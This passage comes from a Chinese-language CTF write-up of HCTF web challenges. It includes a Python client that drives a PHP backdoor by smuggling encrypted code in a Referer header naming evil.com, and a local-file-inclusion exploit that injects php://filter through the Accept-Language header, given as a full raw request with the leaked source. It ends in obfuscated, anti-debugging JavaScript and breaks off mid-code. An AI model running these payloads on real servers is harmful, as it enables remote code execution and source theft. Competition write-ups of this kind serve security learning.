class="string">&#x27;http://vps1.blue-whale.me:23332/backdoor.php&#x27;</span></span><br><span class="line">kh = <span class="string">&#x27;d03a&#x27;</span></span><br><span class="line">kf = <span class="string">&#x27;1f3c&#x27;</span></span><br><span class="line">key = kh + kf</span><br><span class="line">sess = requests.Session()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span>(<span class="params">content, key</span>):</span></span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; len(content):</span><br><span class="line">        j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> j &lt; len(key) <span class="keyword">and</span> i &lt; len(content):</span><br><span class="line">            result += chr(ord(content[i]) ^ ord(key[j]))</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">            j += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hack</span>(<span class="params">code</span>):</span></span><br><span class="line">    head = hashlib.md5(<span class="string">&#x27;ff&#x27;</span> + kh).hexdigest()[:<span class="number">3</span>]</span><br><span class="line">    tail = hashlib.md5(<span class="string">&#x27;ff&#x27;</span> + kf).hexdigest()[:<span class="number">3</span>]</span><br><span class="line">    payload = zlib.compress(code)</span><br><span class="line">    payload = xor(payload, key)</span><br><span class="line">    payload = base64.b64encode(payload)</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;_&#x27;</span>).replace(<span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;http://evil.com/?a=%s&amp;b=%s&amp;c=%s&#x27;</span> % (head, payload, tail),</span><br><span class="line">        <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;fr-CH, fr;q=0.0, en;q=0.1, de;q=0.2, *;q=0.5&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    result = sess.get(url, headers=headers).content</span><br><span class="line">    result = re.findall(<span class="string">&#x27;&lt;%s&gt;(.*?)&lt;/%s&gt;&#x27;</span> % (key, key), result)[<span class="number">0</span>]</span><br><span class="line">    result = base64.b64decode(result)</span><br><span class="line">    result = xor(result, key)</span><br><span class="line">    result = zlib.decompress(result)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">print</span> hack(raw_input(<span class="string">&#x27;php&gt; &#x27;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>最后得到flag为<br><code>flag&#123;Y0U_r_brave_t0_so1ve_probl3M&#125;</code></p>
<hr>
<h1 id="Global-Page-175"><a href="#Global-Page-175" class="headerlink" title="Global Page(175)"></a>Global Page(175)</h1><p>随便点一个page，在Warning里面显示了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Warning: include(pwn&#x2F;zh-CN.php): failed to open stream: No such file or directory in &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php on line 39</span><br><span class="line"></span><br><span class="line">Warning: include(): Failed opening &#39;pwn&#x2F;zh-CN.php&#39; for inclusion (include_path&#x3D;&#39;.:&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#39;) in &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php on line 39</span><br></pre></td></tr></table></figure>

<p>所以是一个文件包含，根据输入的page包含一个page/zh-CN.php的文件，用php伪协议读掩码，%00截断后面的/zh-CN.php</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php%00</span><br></pre></td></tr></table></figure>

<p>但是发现过滤了“/”和“.”，并且无法使用%00截断，所以不能通过page进行文件包含，但是可以发现page后面的/zh-CH.php刚好是accept-language里面的语言，因此就可以通过修改accept-language进行文件包含，发送请求包如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;?page&#x3D;php: HTTP&#x2F;1.1</span><br><span class="line">Host: vps1.blue-whale.me:23334</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;80.0.3987.132 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index;q&#x3D;0.8</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>将因为存在page参数才会开始包含，但是page里不能含有“/”，因此可以将page设置为“php:”，在Accept-Language里设置为“/filter/read=convert.base64-encode/resource=index;q=0.8”即可包含到index源码，源码如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">ini_set(&#39;display_errors&#39;, 1);</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset&#x3D;utf-8&gt;</span><br><span class="line">&lt;title&gt;Global Page&lt;&#x2F;title&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">.rtl &#123;</span><br><span class="line">  direction: rtl;</span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">$dir &#x3D; &quot;&quot;;</span><br><span class="line">if(isset($_GET[&#39;page&#39;])) &#123;</span><br><span class="line">    $dir &#x3D; str_replace([&#39;.&#39;, &#39;&#x2F;&#39;], &#39;&#39;, $_GET[&#39;page&#39;]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(empty($dir)) &#123;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;ul&gt;</span><br><span class="line">    &lt;li&gt;&lt;a href&#x3D;&quot;.&#x2F;?page&#x3D;pwn&quot;&gt;Pwn&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;</span><br><span class="line">    &lt;li&gt;&lt;del&gt;Tokyo Westerns&lt;&#x2F;del&gt;&lt;&#x2F;li&gt;</span><br><span class="line">    &lt;li&gt;&lt;a href&#x3D;&quot;.&#x2F;?page&#x3D;ctf&quot;&gt;CTF&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;</span><br><span class="line">&lt;&#x2F;ul&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">    foreach(explode(&quot;,&quot;, $_SERVER[&#39;HTTP_ACCEPT_LANGUAGE&#39;]) as $lang) &#123;</span><br><span class="line">        $l &#x3D; trim(explode(&quot;;&quot;, $lang)[0]);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;p&lt;?&#x3D;($l&#x3D;&#x3D;&#x3D;&#39;he&#39;)?&quot; class&#x3D;rtl&quot;:&quot;&quot;?&gt;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">        include &quot;$dir&#x2F;$l.php&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;p&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>最后包含flag.php获取flag<br><code>flag&#123;i_f0und_SiMp13_LFI_gogogo&#125;</code></p>
<hr>
<h1 id="BabyCrack-200"><a href="#BabyCrack-200" class="headerlink" title="BabyCrack(200)"></a>BabyCrack(200)</h1><p>类似FxxkingBackdoor，是JavaScript的反混淆，给一个输入需要符合一定条件才会得到flag，而整个解密输入的逻辑都在一个js文件中，在网页源码里拿到最开始的源码=_=.js如下</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> _0x180a=[<span class="string">&#x27;random&#x27;</span>,<span class="string">&#x27;charCodeAt&#x27;</span>,<span class="string">&#x27;fromCharCode&#x27;</span>,<span class="string">&#x27;parse&#x27;</span>,<span class="string">&#x27;substr&#x27;</span>,<span class="string">&#x27;\x5cw+&#x27;</span>,<span class="string">&#x27;replace&#x27;</span>,<span class="string">&#x27;(3()&#123;(3\x20a()&#123;7&#123;(3\x20b(2)&#123;9((\x27\x27+(2/2)).5!==1||2%g===0)&#123;(3()&#123;&#125;).8(\x274\x27)()&#125;c&#123;4&#125;b(++2)&#125;)(0)&#125;d(e)&#123;f(a,6)&#125;&#125;)()&#125;)();&#x27;</span>,<span class="string">&#x27;||i|function|debugger|length|5000|try|constructor|if|||else|catch||setTimeout|20&#x27;</span>,<span class="string">&#x27;pop&#x27;</span>,<span class="string">&#x27;length&#x27;</span>,<span class="string">&#x27;join&#x27;</span>,<span class="string">&#x27;getElementById&#x27;</span>,<span class="string">&#x27;message&#x27;</span>,<span class="string">&#x27;log&#x27;</span>,<span class="string">&#x27;Welcome\x20to\x20HCTF:&gt;&#x27;</span>,<span class="string">&#x27;Congratulations!\x20you\x20got\x20it!&#x27;</span>,<span class="string">&#x27;Sorry,\x20you\x20are\x20wrong...&#x27;</span>,<span class="string">&#x27;window.console.clear();window.console.log(\x27Welcome\x20to\x20HCTF\x20:&gt;\x27)&#x27;</span>,<span class="string">&#x27;version&#x27;</span>,<span class="string">&#x27;error&#x27;</span>,<span class="string">&#x27;download&#x27;</span>,<span class="string">&#x27;substring&#x27;</span>,<span class="string">&#x27;push&#x27;</span>,<span class="string">&#x27;Function&#x27;</span>,<span class="string">&#x27;charAt&#x27;</span>,<span class="string">&#x27;idle&#x27;</span>,<span class="string">&#x27;pyW5F1U43VI&#x27;</span>,<span class="string">&#x27;init&#x27;</span>,<span class="string">&#x27;https://the-extension.com&#x27;</span>,<span class="string">&#x27;local&#x27;</span>,<span class="string">&#x27;storage&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;then&#x27;</span>,<span class="string">&#x27;get&#x27;</span>,<span class="string">&#x27;getTime&#x27;</span>,<span class="string">&#x27;setUTCHours&#x27;</span>,<span class="string">&#x27;origin&#x27;</span>,<span class="string">&#x27;set&#x27;</span>,<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;loading&#x27;</span>,<span class="string">&#x27;status&#x27;</span>,<span class="string">&#x27;removeListener&#x27;</span>,<span class="string">&#x27;onUpdated&#x27;</span>,<span class="string">&#x27;callee&#x27;</span>,<span class="string">&#x27;addListener&#x27;</span>,<span class="string">&#x27;onMessage&#x27;</span>,<span class="string">&#x27;runtime&#x27;</span>,<span class="string">&#x27;executeScript&#x27;</span>,<span class="string">&#x27;data&#x27;</span>,<span class="string">&#x27;test&#x27;</span>,<span class="string">&#x27;http://&#x27;</span>,<span class="string">&#x27;Url\x20error&#x27;</span>,<span class="string">&#x27;query&#x27;</span>,<span class="string">&#x27;filter&#x27;</span>,<span class="string">&#x27;active&#x27;</span>,<span class="string">&#x27;floor&#x27;</span>];(<span class="function"><span class="keyword">function</span>(<span class="params">_0xd4b7d6,_0xad25ab</span>)</span>&#123;<span class="keyword">var</span> _0x5e3956=<span class="function"><span class="keyword">function</span>(<span class="params">_0x1661d3</span>)</span>&#123;<span class="keyword">while</span>(--_0x1661d3)&#123;_0xd4b7d6[<span class="string">&#x27;push&#x27;</span>](_0xd4b7d6[<span class="string">&#x27;shift&#x27;</span>]());&#125;&#125;;_0x5e3956(++_0xad25ab);&#125;(_0x180a,<span class="number">0x1a2</span>));<span class="keyword">var</span> _0xa180=<span class="function"><span class="keyword">function</span>(<span class="params">_0x5c351c,_0x2046d8</span>)</span>&#123;_0x5c351c=_0x5c351c<span class="number">-0x0</span>;<span class="keyword">var</span> _0x26f3b3=_0x180a[_0x5c351c];<span class="keyword">return</span> _0x26f3b3;&#125;;<span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params">_0x5b7c0c</span>)</span>&#123;<span class="keyword">try</span>&#123;<span class="keyword">var</span> _0x2e2f8d=[<span class="string">&#x27;code&#x27;</span>,_0xa180(<span class="string">&#x27;0x0&#x27;</span>),_0xa180(<span class="string">&#x27;0x1&#x27;</span>),_0xa180(<span class="string">&#x27;0x2&#x27;</span>),<span class="string">&#x27;invalidMonetizationCode&#x27;</span>,_0xa180(<span class="string">&#x27;0x3&#x27;</span>),_0xa180(<span class="string">&#x27;0x4&#x27;</span>),_0xa180(<span class="string">&#x27;0x5&#x27;</span>),_0xa180(<span class="string">&#x27;0x6&#x27;</span>),_0xa180(<span class="string">&#x27;0x7&#x27;</span>),_0xa180(<span class="string">&#x27;0x8&#x27;</span>),_0xa180(<span class="string">&#x27;0x9&#x27;</span>),_0xa180(<span class="string">&#x27;0xa&#x27;</span>),_0xa180(<span class="string">&#x27;0xb&#x27;</span>),_0xa180(<span class="string">&#x27;0xc&#x27;</span>),_0xa180(<span class="string">&#x27;0xd&#x27;</span>),_0xa180(<span class="string">&#x27;0xe&#x27;</span>),_0xa180(<span class="string">&#x27;0xf&#x27;</span>),_0xa180(<span class="string">&#x27;0x10&#x27;</span>),_0xa180(<span class="string">&#x27;0x11&#x27;</span>),<span class="string">&#x27;url&#x27;</span>,_0xa180(<span class="string">&#x27;0x12&#x27;</span>),_0xa180(<span class="string">&#x27;0x13&#x27;</span>),_0xa180(<span class="string">&#x27;0x14&#x27;</span>),_0xa180(<span class="string">&#x27;0x15&#x27;</span>),_0xa180(<span class="string">&#x27;0x16&#x27;</span>),_0xa180(<span class="string">&#x27;0x17&#x27;</span>),_0xa180(<span class="string">&#x27;0x18&#x27;</span>),<span class="string">&#x27;tabs&#x27;</span>,_0xa180(<span class="string">&#x27;0x19&#x27;</span>),_0xa180(<span class="string">&#x27;0x1a&#x27;</span>),_0xa180(<span class="string">&#x27;0x1b&#x27;</span>),_0xa180(<span class="string">&#x27;0x1c&#x27;</span>),_0xa180(<span class="string">&#x27;0x1d&#x27;</span>),<span class="string">&#x27;replace&#x27;</span>,_0xa180(<span class="string">&#x27;0x1e&#x27;</span>),_0xa180(<span class="string">&#x27;0x1f&#x27;</span>),<span class="string">&#x27;includes&#x27;</span>,_0xa180(<span class="string">&#x27;0x20&#x27;</span>),<span class="string">&#x27;length&#x27;</span>,_0xa180(<span class="string">&#x27;0x21&#x27;</span>),_0xa180(<span class="string">&#x27;0x22&#x27;</span>),_0xa180(<span class="string">&#x27;0x23&#x27;</span>),_0xa180(<span class="string">&#x27;0x24&#x27;</span>),_0xa180(<span class="string">&#x27;0x25&#x27;</span>),_0xa180(<span class="string">&#x27;0x26&#x27;</span>),_0xa180(<span class="string">&#x27;0x27&#x27;</span>),_0xa180(<span class="string">&#x27;0x28&#x27;</span>),_0xa180(<span class="string">&#x27;0x29&#x27;</span>),<span class="string">&#x27;toString&#x27;</span>,_0xa180(<span class="string">&#x27;0x2a&#x27;</span>),<span class="string">&#x27;split&#x27;</span>];<span class="keyword">var</span> _0x50559f=_0x5b7c0c[_0x2e2f8d[<span class="number">0x5</span>]](<span class="number">0x0</span>,<span class="number">0x4</span>);<span class="keyword">var</span> _0x5cea12=<span class="built_in">parseInt</span>(btoa(_0x50559f),<span class="number">0x20</span>);<span class="built_in">eval</span>(<span class="function"><span class="keyword">function</span>(<span class="params">_0x200db2,_0x177f13,_0x46da6f,_0x802d91,_0x2d59cf,_0x2829f2</span>)</span>&#123;_0x2d59cf=<span class="function"><span class="keyword">function</span>(<span class="params">_0x4be75f</span>)</span>&#123;<span class="keyword">return</span> _0x4be75f[<span class="string">&#x27;toString&#x27;</span>](_0x177f13);&#125;;<span class="keyword">if</span>(!<span class="string">&#x27;&#x27;</span>[<span class="string">&#x27;replace&#x27;</span>](<span class="regexp">/^/</span>,<span class="built_in">String</span>))&#123;<span class="keyword">while</span>(_0x46da6f--)_0x2829f2[_0x2d59cf(_0x46da6f)]=_0x802d91[_0x46da6f]||_0x2d59cf(_0x46da6f);_0x802d91=[<span class="function"><span class="keyword">function</span>(<span class="params">_0x5e8f1a</span>)</span>&#123;<span class="keyword">return</span> _0x2829f2[_0x5e8f1a];&#125;];_0x2d59cf=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span> _0xa180(<span class="string">&#x27;0x2b&#x27;</span>);&#125;;_0x46da6f=<span class="number">0x1</span>;&#125;;<span class="keyword">while</span>(_0x46da6f--)<span class="keyword">if</span>(_0x802d91[_0x46da6f])_0x200db2=_0x200db2[_0xa180(<span class="string">&#x27;0x2c&#x27;</span>)](<span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">&#x27;\x5cb&#x27;</span>+_0x2d59cf(_0x46da6f)+<span class="string">&#x27;\x5cb&#x27;</span>,<span class="string">&#x27;g&#x27;</span>),_0x802d91[_0x46da6f]);<span class="keyword">return</span> _0x200db2;&#125;(_0xa180(<span class="string">&#x27;0x2d&#x27;</span>),<span class="number">0x11</span>,<span class="number">0x11</span>,_0xa180(<span class="string">&#x27;0x2e&#x27;</span>)[<span class="string">&#x27;split&#x27;</span>](<span class="string">&#x27;|&#x27;</span>),<span class="number">0x0</span>,&#123;&#125;));(<span class="function"><span class="keyword">function</span>(<span class="params">_0x3291b7,_0xced890</span>)</span>&#123;<span class="keyword">var</span> _0xaed809=<span class="function"><span class="keyword">function</span>(<span class="params">_0x3aba26</span>)</span>&#123;<span class="keyword">while</span>(--_0x3aba26)&#123;_0x3291b7[_0xa180(<span class="string">&#x27;0x4&#x27;</span>)](_0x3291b7[<span class="string">&#x27;shift&#x27;</span>]());&#125;&#125;;_0xaed809(++_0xced890);&#125;(_0x2e2f8d,_0x5cea12%<span class="number">0x7b</span>));<span class="keyword">var</span> _0x43c8d1=<span class="function"><span class="keyword">function</span>(<span class="params">_0x3120e0</span>)</span>&#123;<span class="keyword">var</span> _0x3120e0=<span class="built_in">parseInt</span>(_0x3120e0,<span class="number">0x10</span>);<span class="keyword">var</span> _0x3a882f=_0x2e2f8d[_0x3120e0];<span class="keyword">return</span> _0x3a882f;&#125;;<span class="keyword">var</span> _0x1c3854=<span class="function"><span class="keyword">function</span>(<span class="params">_0x52ba71</span>)</span>&#123;<span class="keyword">var</span> _0x52b956=<span class="string">&#x27;0x&#x27;</span>;<span class="keyword">for</span>(<span class="keyword">var</span> _0x59c050=<span class="number">0x0</span>;_0x59c050&lt;_0x52ba71[_0x43c8d1(<span class="number">0x8</span>)];_0x59c050++)&#123;_0x52b956+=_0x52ba71[_0x43c8d1(<span class="string">&#x27;f&#x27;</span>)](_0x59c050)[_0x43c8d1(<span class="number">0xc</span>)](<span class="number">0x10</span>);&#125;<span class="keyword">return</span> _0x52b956;&#125;;<span class="keyword">var</span> _0x76e1e8=_0x5b7c0c[_0x43c8d1(<span class="number">0xe</span>)](<span class="string">&#x27;_&#x27;</span>);<span class="keyword">var</span> _0x34f55b=(_0x1c3854(_0x76e1e8[<span class="number">0x0</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">-0x2</span>,<span class="number">0x2</span>))^_0x1c3854(_0x76e1e8[<span class="number">0x0</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">0x4</span>,<span class="number">0x1</span>)))%_0x76e1e8[<span class="number">0x0</span>][_0x43c8d1(<span class="number">0x8</span>)]==<span class="number">0x5</span>;<span class="keyword">if</span>(!_0x34f55b)&#123;<span class="keyword">return</span>![];&#125;b2c=<span class="function"><span class="keyword">function</span>(<span class="params">_0x3f9bc5</span>)</span>&#123;<span class="keyword">var</span> _0x3c3bd8=<span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ234567&#x27;</span>;<span class="keyword">var</span> _0x4dc510=[];<span class="keyword">var</span> _0x4a199f=<span class="built_in">Math</span>[_0xa180(<span class="string">&#x27;0x25&#x27;</span>)](_0x3f9bc5[_0x43c8d1(<span class="number">0x8</span>)]/<span class="number">0x5</span>);<span class="keyword">var</span> _0x4ee491=_0x3f9bc5[_0x43c8d1(<span class="number">0x8</span>)]%<span class="number">0x5</span>;<span class="keyword">if</span>(_0x4ee491!=<span class="number">0x0</span>)&#123;<span class="keyword">for</span>(<span class="keyword">var</span> _0x1e1753=<span class="number">0x0</span>;_0x1e1753&lt;<span class="number">0x5</span>-_0x4ee491;_0x1e1753++)&#123;_0x3f9bc5+=<span class="string">&#x27;&#x27;</span>;&#125;_0x4a199f+=<span class="number">0x1</span>;&#125;<span class="keyword">for</span>(_0x1e1753=<span class="number">0x0</span>;_0x1e1753&lt;_0x4a199f;_0x1e1753++)&#123;_0x4dc510[_0x43c8d1(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[_0x43c8d1(<span class="string">&#x27;1d&#x27;</span>)](_0x3f9bc5[_0x43c8d1(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753*<span class="number">0x5</span>)&gt;&gt;<span class="number">0x3</span>));_0x4dc510[_0x43c8d1(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[_0x43c8d1(<span class="string">&#x27;1d&#x27;</span>)]((_0x3f9bc5[_0x43c8d1(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753*<span class="number">0x5</span>)&amp;<span class="number">0x7</span>)&lt;&lt;<span class="number">0x2</span>|_0x3f9bc5[_0x43c8d1(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753*<span class="number">0x5</span>+<span class="number">0x1</span>)&gt;&gt;<span class="number">0x6</span>));_0x4dc510[_0x43c8d1(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[_0x43c8d1(<span class="string">&#x27;1d&#x27;</span>)]((_0x3f9bc5[_0x43c8d1(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753*<span class="number">0x5</span>+<span class="number">0x1</span>)&amp;<span class="number">0x3f</span>)&gt;&gt;<span class="number">0x1</span>));_0x4dc510[_0x43c8d1(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[_0x43c8d1(<span class="string">&#x27;1d&#x27;</span>)]((_0x3f9bc5[_0x43c8d1(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753*<span class="number">0x5</span>+<span class="number">0x1</span>)&amp;<span class="number">0x1</span>)&lt;&lt;<span class="number">0x4</span>|_0x3f9bc5[_0x43c8d1(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753*<span class="number">0x5</span>+<span class="number">0x2</span>)&gt;&gt;<span class="number">0x4</span>));_0x4dc510[_0x43c8d1(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[_0x43c8d1(<span class="string">&#x27;1d&#x27;</span>)]((_0x3f9bc5[_0x43c8d1(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753*<span class="number">0x5</span>+<span class="number">0x2</span>)&amp;<span class="number">0xf</span>)&lt;&lt;<span class="number">0x1</span>|_0x3f9bc5[_0x43c8d1(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753*<span class="number">0x5</span>+<span class="number">0x3</span>)&gt;&gt;<span class="number">0x7</span>));_0x4dc510[_0x43c8d1(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[_0x43c8d1(<span class="string">&#x27;1d&#x27;</span>)]((_0x3f9bc5[_0x43c8d1(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753*<span class="number">0x5</span>+<span class="number">0x3</span>)&amp;<span class="number">0x7f</span>)&gt;&gt;<span class="number">0x2</span>));_0x4dc510[_0x43c8d1(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[_0x43c8d1(<span class="string">&#x27;1d&#x27;</span>)]((_0x3f9bc5[_0x43c8d1(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753*<span class="number">0x5</span>+<span class="number">0x3</span>)&amp;<span class="number">0x3</span>)&lt;&lt;<span class="number">0x3</span>|_0x3f9bc5[_0x43c8d1(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753*<span class="number">0x5</span>+<span class="number">0x4</span>)&gt;&gt;<span class="number">0x5</span>));_0x4dc510[_0x43c8d1(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[_0x43c8d1(<span class="string">&#x27;1d&#x27;</span>)](_0x3f9bc5[_0x43c8d1(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753*<span class="number">0x5</span>+<span class="number">0x4</span>)&amp;<span class="number">0x1f</span>));&#125;<span class="keyword">var</span> _0x545c12=<span class="number">0x0</span>;<span class="keyword">if</span>(_0x4ee491==<span class="number">0x1</span>)_0x545c12=<span class="number">0x6</span>;<span class="keyword">else</span> <span class="keyword">if</span>(_0x4ee491==<span class="number">0x2</span>)_0x545c12=<span class="number">0x4</span>;<span class="keyword">else</span> <span class="keyword">if</span>(_0x4ee491==<span class="number">0x3</span>)_0x545c12=<span class="number">0x3</span>;<span class="keyword">else</span> <span class="keyword">if</span>(_0x4ee491==<span class="number">0x4</span>)_0x545c12=<span class="number">0x1</span>;<span class="keyword">for</span>(_0x1e1753=<span class="number">0x0</span>;_0x1e1753&lt;_0x545c12;_0x1e1753++)_0x4dc510[_0xa180(<span class="string">&#x27;0x2f&#x27;</span>)]();<span class="keyword">for</span>(_0x1e1753=<span class="number">0x0</span>;_0x1e1753&lt;_0x545c12;_0x1e1753++)_0x4dc510[_0x43c8d1(<span class="string">&#x27;1b&#x27;</span>)](<span class="string">&#x27;=&#x27;</span>);(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;(<span class="function"><span class="keyword">function</span> <span class="title">_0x3c3bd8</span>(<span class="params"></span>)</span>&#123;<span class="keyword">try</span>&#123;(<span class="function"><span class="keyword">function</span> <span class="title">_0x4dc510</span>(<span class="params">_0x460a91</span>)</span>&#123;<span class="keyword">if</span>((<span class="string">&#x27;&#x27;</span>+_0x460a91/_0x460a91)[_0xa180(<span class="string">&#x27;0x30&#x27;</span>)]!==<span class="number">0x1</span>||_0x460a91%<span class="number">0x14</span>===<span class="number">0x0</span>)&#123;(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;[<span class="string">&#x27;constructor&#x27;</span>](<span class="string">&#x27;debugger&#x27;</span>)());&#125;<span class="keyword">else</span>&#123;<span class="keyword">debugger</span>;&#125;_0x4dc510(++_0x460a91);&#125;(<span class="number">0x0</span>));&#125;<span class="keyword">catch</span>(_0x30f185)&#123;<span class="built_in">setTimeout</span>(_0x3c3bd8,<span class="number">0x1388</span>);&#125;&#125;());&#125;());<span class="keyword">return</span> _0x4dc510[_0xa180(<span class="string">&#x27;0x31&#x27;</span>)](<span class="string">&#x27;&#x27;</span>);&#125;;e=_0x1c3854(b2c(_0x76e1e8[<span class="number">0x2</span>])[_0x43c8d1(<span class="number">0xe</span>)](<span class="string">&#x27;=&#x27;</span>)[<span class="number">0x0</span>])^<span class="number">0x53a3f32</span>;<span class="keyword">if</span>(e!=<span class="number">0x4b7c0a73</span>)&#123;<span class="keyword">return</span>![];&#125;f=_0x1c3854(b2c(_0x76e1e8[<span class="number">0x3</span>])[_0x43c8d1(<span class="number">0xe</span>)](<span class="string">&#x27;=&#x27;</span>)[<span class="number">0x0</span>])^e;<span class="keyword">if</span>(f!=<span class="number">0x4315332</span>)&#123;<span class="keyword">return</span>![];&#125;n=f*e*_0x76e1e8[<span class="number">0x0</span>][_0x43c8d1(<span class="number">0x8</span>)];h=<span class="function"><span class="keyword">function</span>(<span class="params">_0x4c466e,_0x28871</span>)</span>&#123;<span class="keyword">var</span> 